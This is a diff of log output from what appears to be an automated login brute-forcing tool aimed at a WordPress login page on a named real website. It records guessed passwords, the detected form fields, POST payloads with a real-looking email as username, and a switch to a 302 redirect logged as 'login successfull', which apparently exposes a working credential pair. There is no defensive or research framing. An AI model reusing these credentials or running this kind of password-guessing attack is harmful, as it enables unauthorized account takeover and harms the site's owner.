@@ -1,11 +1,10 @@
-INFO:root:random password generated: Tf|U/QgTJx
+INFO:root:random password generated: u+Pzq;F1l_
 INFO:root:username_element: log
 INFO:root:password_element: pwd
-INFO:root:random password generated: ,{O!|`I%}*
+INFO:root:random password generated: #n*9i9>?#n
 INFO:root:username_element: log
 INFO:root:password_element: pwd
 INFO:root:{
-  "url": "https://alqlambara.com/qemam/wp-login.php",
   "pass_user": "pass_user.csv",
   "params_list": {
     "password_param": [
@@ -29,9 +28,9 @@ INFO:root:{
   "user_param": "log",
   "password_param": "pwd",
   "contentLen": 360.0,
-  "status_code": 200,
   "post_data": {
     "log": "m7mdassi",
+    "pwd": "#n*9i9>?#n",
     "wp-submit": "\u062f\u062e\u0648\u0644",
     "redirect_to": "https://alqlambara.com/qemam/wp-admin/",
     "testcookie": "1"
@@ -55,11 +54,12 @@ INFO:root:{
     "sec-fetch-site": "same-origin",
     "sec-fetch-user": "?1"
   },
+  "status_code": 200,
   "req_body_type": "URL_ENCODED"
 }
-INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'wp-submit': '\u062f\u062e\u0648\u0644', 'redirect_to': 'https://alqlambara.com/qemam/wp-admin/', 'testcookie': '1', 'pwd': 'asdasd'}
+INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'pwd': 'bara123405', 'wp-submit': '\u062f\u062e\u0648\u0644', 'redirect_to': 'https://alqlambara.com/qemam/wp-admin/', 'testcookie': '1'}
 INFO:root: max_similarity: 0.8767379679144385
-INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'wp-submit': '\u062f\u062e\u0648\u0644', 'redirect_to': 'https://alqlambara.com/qemam/wp-admin/', 'testcookie': '1', 'pwd': 'astmamsh123'}
+INFO:root:[+ payload]: {'log': 'alqlambara@gmail.com', 'pwd': 'astmamsh123', 'wp-submit': '\u062f\u062e\u0648\u0644', 'redirect_to': 'https://alqlambara.com/qemam/wp-admin/', 'testcookie': '1'}
 INFO:root:[check_login] Status code changed!: 302
 INFO:root:login successfull
 
